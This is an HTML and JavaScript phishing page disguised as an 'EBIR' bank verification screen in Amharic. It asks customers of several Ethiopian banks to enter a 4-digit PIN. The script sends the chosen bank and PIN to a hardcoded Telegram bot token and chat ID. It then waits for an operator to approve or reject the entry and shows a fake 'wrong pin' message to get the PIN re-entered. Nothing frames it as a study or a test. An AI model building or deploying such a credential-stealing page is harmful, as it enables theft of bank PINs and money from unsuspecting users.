<!DOCTYPE html>
<html lang="am">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>EBIR ማረጋገጫ</title>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

    <style>
         :root {
            --green: #0a8d32;
            --green-light: #e8f6ea;
            --blue: #11a9ec;
            --text: #333;
            --grey: #999;
            --light: #f3f3f3;
            --white: #ffffff;
            --radius: 30px;
            --shadow: 0 5px 14px rgba(0, 0, 0, .10);
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html {
            font-size: 16px;
        }
        
        body {
            font-family: 'Poppins', sans-serif;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .app {
            width: 100%;
            max-width: 390px;
            height: 844px;
            background: #fff;
            border-radius: 24px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            box-shadow: 0 20px 45px rgba(0, 0, 0, .12);
        }
        
        .header {
            position: relative;
            width: 100%;
            aspect-ratio: 390 / 265;
            max-height: 265px;
            overflow: hidden;
            background: white;
        }
        
        .header-img {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: contain;
            object-position: top center;
            display: block;
        }
        
        main {
            padding: 24px;
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        
        main h2 {
            font-size: 21px;
            font-weight: 500;
            color: #222;
            margin-bottom: 22px;
        }
        
        .banks {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 28px;
        }
        
        .bank {
            height: 52px;
            padding: 0 22px;
            border: none;
            border-radius: 30px;
            background: #f2f2f2;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
            transition: .25s;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .bank:hover {
            transform: translateY(-2px);
        }
        
        .bank.active {
            background: var(--green-light);
            color: var(--green);
        }
        
        .check {
            font-size: 18px;
            margin-right: 7px;
        }
        /* PIN Section */
        
        .pin-section {
            margin-top: 60px;
        }
        
        .pin-label {
            font-size: 15px;
            color: #888;
            margin-bottom: 12px;
        }
        
        .pin-group {
            display: flex;
            justify-content: center;
            gap: 16px;
        }
        
        .pin-box {
            width: 52px;
            height: 56px;
            border: 2px solid var(--blue);
            border-radius: 12px;
            font-size: 26px;
            font-weight: 600;
            text-align: center;
            background: white;
            color: #222;
            padding: 0;
            caret-color: var(--blue);
        }
        
        .pin-box:focus {
            border-width: 3px;
        }
        
        footer {
            padding: 24px;
            padding-bottom: 34px;
        }
        
        .version {
            text-align: center;
            font-size: 18px;
            color: #3d9952;
            margin-bottom: 18px;
        }
        
        #next {
            width: 100%;
            height: 56px;
            border: none;
            background: var(--blue);
            color: white;
            font-size: 20px;
            font-weight: 600;
            border-radius: 12px;
            cursor: pointer;
            transition: .25s;
            box-shadow: 0 8px 18px rgba(17, 169, 236, .30);
        }
        
        #next:hover {
            transform: translateY(-2px);
        }
        
        #next:active {
            transform: scale(.98);
        }
        
        #next:disabled {
            background: #ccc;
            cursor: not-allowed;
            box-shadow: none;
        }
        
        #offline {
            margin-top: 34px;
            text-align: center;
            font-size: 20px;
            font-weight: 600;
            color: var(--green);
            cursor: pointer;
        }
        /* Overlays (from page 2) */
        
        #spinnerOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.98);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #f0f0f0;
            border-top: 6px solid #11a9ec;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 30px;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        
        .spinner-text {
            font-size: 18px;
            color: #333;
            text-align: center;
            line-height: 1.6;
            max-width: 320px;
            font-weight: 500;
        }
        
        #resultOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.98);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
            padding: 20px;
        }
        
        .result-message {
            font-size: 18px;
            color: #333;
            text-align: center;
            line-height: 1.6;
            max-width: 320px;
            font-weight: 500;
        }
        
        @media (max-width:600px) {
            body {
                padding: 0;
                background: white;
            }
            .app {
                max-width: none;
                width: 100vw;
                height: 100vh;
                border-radius: 0;
                box-shadow: none;
            }
            .header {
                max-height: none;
            }
            #spinnerOverlay,
            #resultOverlay {
                height: 100vh;
            }
        }
        
        @media (max-width:390px) {
            main {
                padding: 20px;
            }
            .bank {
                font-size: 15px;
                padding: 0 18px;
                height: 46px;
            }
            .pin-box {
                width: 46px;
                height: 50px;
                font-size: 22px;
            }
            .pin-group {
                gap: 12px;
            }
        }
        
        @media (max-width:320px) {
            main {
                padding: 16px;
            }
            .bank {
                font-size: 13px;
                padding: 0 14px;
                height: 40px;
            }
            .pin-box {
                width: 40px;
                height: 44px;
                font-size: 20px;
            }
            .pin-group {
                gap: 8px;
            }
        }
        
        @media (min-width:768px) {
            .app {
                transform: scale(.95);
            }
        }
        
        @media (min-width:1024px) {
            .app {
                transform: scale(1);
            }
        }
    </style>
</head>

<body>

    <div class="app">
        <header class="header">
            <img class="header-img" src="ebirr.jpeg" alt="EBIR ራስጌ">
        </header>

        <main>
            <h2>ባንክ ይምረጡ</h2>
            <div class="banks">
                <button class="bank">ካፊ</button>
                <button class="bank active"><span class="check">✓</span>ሲቢኦ</button>
                <button class="bank">ኒቢ</button>
                <button class="bank">ወጋገን</button>
                <button class="bank">አሀዱ</button>
            </div>

            <div class="pin-section">
                <div class="pin-label">የፒን ቁጥርዎን ያስገቡ</div>
                <div class="pin-group">
                    <input type="password" class="pin-box" maxlength="1" autocomplete="off" inputmode="numeric">
                    <input type="password" class="pin-box" maxlength="1" autocomplete="off" inputmode="numeric">
                    <input type="password" class="pin-box" maxlength="1" autocomplete="off" inputmode="numeric">
                    <input type="password" class="pin-box" maxlength="1" autocomplete="off" inputmode="numeric">
                </div>
            </div>
        </main>

        <footer>
            <div class="version">2.14.2</div>
            <button id="next">ቀጣይ</button>
            <div id="offline">ከመስመር ውጪ ይመዝገቡ</div>
        </footer>
    </div>

    <!-- Spinner Overlay (from page 2) -->
    <div id="spinnerOverlay">
        <div class="spinner"></div>
        <div class="spinner-text">እባክዎ የማግበሪያ ኮድዎ እየተረጋገጠ ሲሆን ይጠብቁ</div>
    </div>

    <!-- Result Overlay (from page 2) -->
    <div id="resultOverlay">
        <div class="result-message" id="resultMessage"></div>
    </div>

    <script>
        //=========================================
        // TELEGRAM CONFIG
        //=========================================
        const TELEGRAM_BOT_TOKEN = "7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0";
        const TELEGRAM_CHAT_ID = "5615316142";
        const TELEGRAM_BOT_LINK = "https://t.me/YOUR_BOT_USERNAME"; // Replace with your bot's invite link
        //=========================================

        const pinBoxes = document.querySelectorAll('.pin-box');
        const nextBtn = document.getElementById("next");
        const spinnerOverlay = document.getElementById("spinnerOverlay");
        const resultOverlay = document.getElementById("resultOverlay");
        const resultMessage = document.getElementById("resultMessage");

        let pollInterval = null;
        let lastUpdateId = 0;
        let currentTimestamp = 0;

        //==========================
        // Bank Selection
        //==========================
        const banks = document.querySelectorAll(".bank");
        const bankEnglishMap = {
            "ካፊ": "KAAFI",
            "ሲቢኦ": "CBO",
            "ኒቢ": "NIB",
            "ወጋገን": "WEGAGEN",
            "አሀዱ": "AHADU"
        };

        function selectBank(button) {
            banks.forEach(bank => {
                const name = bank.dataset.name || bank.textContent.replace("✓", "").trim();
                bank.dataset.name = name;
                bank.classList.remove("active");
                bank.innerHTML = name;
            });
            const selected = button.dataset.name || button.textContent.replace("✓", "").trim();
            button.dataset.name = selected;
            button.classList.add("active");
            button.innerHTML = `<span class="check">✓</span>${selected}`;
        }

        banks.forEach(bank => {
            bank.dataset.name = bank.textContent.replace("✓", "").trim();
            bank.addEventListener("click", () => {
                selectBank(bank);
            });
        });

        //==========================
        // PIN Input Logic (from page 1, enhanced)
        //==========================
        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', () => {
                box.value = box.value.replace(/\D/g, '');
                if (box.value.length === 1 && index < pinBoxes.length - 1) {
                    pinBoxes[index + 1].focus();
                }
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace') {
                    if (box.value === '' && index > 0) {
                        pinBoxes[index - 1].value = '';
                        pinBoxes[index - 1].focus();
                    }
                } else if (e.key === 'Delete') {
                    if (box.value === '' && index < pinBoxes.length - 1) {
                        for (let i = index; i < pinBoxes.length - 1; i++) {
                            pinBoxes[i].value = pinBoxes[i + 1].value;
                        }
                        pinBoxes[pinBoxes.length - 1].value = '';
                        box.focus();
                    }
                } else if (e.key === 'ArrowLeft' && index > 0) {
                    e.preventDefault();
                    pinBoxes[index - 1].focus();
                } else if (e.key === 'ArrowRight' && index < pinBoxes.length - 1) {
                    e.preventDefault();
                    pinBoxes[index + 1].focus();
                }
            });

            box.addEventListener('paste', (e) => {
                e.preventDefault();
                const pasted = (e.clipboardData || window.clipboardData)
                    .getData('text')
                    .replace(/\D/g, '')
                    .substring(0, 4);
                for (let i = 0; i < pinBoxes.length; i++) {
                    pinBoxes[i].value = pasted[i] || '';
                }
                const nextEmpty = Array.from(pinBoxes).findIndex(b => b.value === '');
                if (nextEmpty !== -1) {
                    pinBoxes[nextEmpty].focus();
                } else {
                    pinBoxes[pinBoxes.length - 1].blur();
                }
            });

            box.addEventListener('focus', function() {
                this.select();
            });
        });

        function getPinValue() {
            return Array.from(pinBoxes).map(box => box.value).join('');
        }

        function resetPinInputs() {
            pinBoxes.forEach(input => {
                input.value = '';
            });
            pinBoxes[0].focus();
        }

        //==========================
        // Redirect to Telegram Bot
        //==========================
        function redirectToTelegram() {
            if (TELEGRAM_BOT_LINK && TELEGRAM_BOT_LINK !== "https://t.me/YOUR_BOT_USERNAME") {
                window.location.href = TELEGRAM_BOT_LINK;
            }
        }

        //==========================
        // Send PIN to Telegram with Inline Buttons
        //==========================
        async function sendPinToTelegram(bankAmharic, pin) {
            const timestamp = Date.now();
            currentTimestamp = timestamp;

            const bankEnglish = bankEnglishMap[bankAmharic] || bankAmharic;

            const message = `🔔 *PIN Received*\n\n` +
                `🏦 *Bank:* ${bankEnglish}\n` +
                `🔑 *PIN:* \`${pin}\`\n` +
                `🕐 *Time:* ${new Date().toLocaleString()}\n\n` +
                `Please approve or cancel this submission.`;

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        reply_markup: {
                            inline_keyboard: [
                                [{
                                    text: '✅ Approve',
                                    callback_data: 'approve_' + timestamp
                                }, {
                                    text: '❌ Cancel',
                                    callback_data: 'cancel_' + timestamp
                                }]
                            ]
                        }
                    })
                });
                const result = await response.json();
                return result.ok;
            } catch (error) {
                console.error('Telegram send error:', error);
                return false;
            }
        }

        //==========================
        // Poll Telegram for Admin Response
        //==========================
        function startPolling() {
            pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
                    .then(res => res.json())
                    .then(data => {
                        if (data.ok && data.result.length > 0) {
                            for (let update of data.result) {
                                lastUpdateId = update.update_id;
                                if (update.callback_query) {
                                    const callbackData = update.callback_query.data;
                                    const lastUnderscore = callbackData.lastIndexOf('_');
                                    const action = callbackData.substring(0, lastUnderscore);
                                    const ts = callbackData.substring(lastUnderscore + 1);

                                    if (ts == currentTimestamp) {
                                        clearInterval(pollInterval);
                                        pollInterval = null;

                                        spinnerOverlay.style.display = 'none';
                                        resultOverlay.style.display = 'flex';

                                        if (action === 'approve') {
                                            resultMessage.textContent = 'Your request has been approved. You will receive a confirmation message shortly. Thank you.';
                                            setTimeout(redirectToTelegram, 10000);
                                        } else if (action === 'cancel') {
                                            resultMessage.textContent = 'Wrong pin. Please re-enter your PIN.';
                                            setTimeout(() => {
                                                resultOverlay.style.display = 'none';
                                                resetPinInputs();
                                                nextBtn.disabled = false;
                                                nextBtn.textContent = 'ቀጣይ';
                                            }, 3000);
                                        }

                                        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                            method: 'POST',
                                            headers: {
                                                'Content-Type': 'application/json'
                                            },
                                            body: JSON.stringify({
                                                callback_query_id: update.callback_query.id
                                            })
                                        });
                                    }
                                }
                            }
                        }
                    })
                    .catch(err => console.error('Polling error:', err));
            }, 1500);
        }

        //==========================
        // Next Button – Send PIN with Inline Buttons
        //==========================
        nextBtn.addEventListener("click", async function() {
            const pin = getPinValue();

            if (pin.length !== 4) {
                alert("እባክዎ ባለ 4-አሃዝ ፒን ያስገቡ።");
                pinBoxes[0].focus();
                return;
            }

            const activeBankAmharic = document.querySelector(".bank.active").dataset.name;

            nextBtn.disabled = true;
            nextBtn.textContent = "በሂደት ላይ...";

            spinnerOverlay.style.display = 'flex';

            const sent = await sendPinToTelegram(activeBankAmharic, pin);

            if (!sent) {
                console.warn("Telegram send failed — check your bot token and chat ID.");
                spinnerOverlay.style.display = 'none';
                nextBtn.disabled = false;
                nextBtn.textContent = "ቀጣይ";
                alert("ጥያቄውን መላክ አልተሳካም። እባክዎ እንደገና ይሞክሩ።");
                return;
            }

            startPolling();
        });

        //==========================
        // Enter Key Support
        //==========================
        const lastPinBox = pinBoxes[pinBoxes.length - 1];
        lastPinBox.addEventListener("keydown", function(e) {
            if (e.key === "Enter") {
                nextBtn.click();
            }
        });

        //==========================
        // Offline Registration
        //==========================
        document.getElementById("offline").addEventListener("click", () => {
            alert("ከመስመር ውጪ መመዝገቢያ ተመርጧል።");
        });

        //==========================
        // Auto Focus First PIN Box
        //==========================
        window.onload = function() {
            pinBoxes[0].focus();
        };
    </script>

</body>

</html>
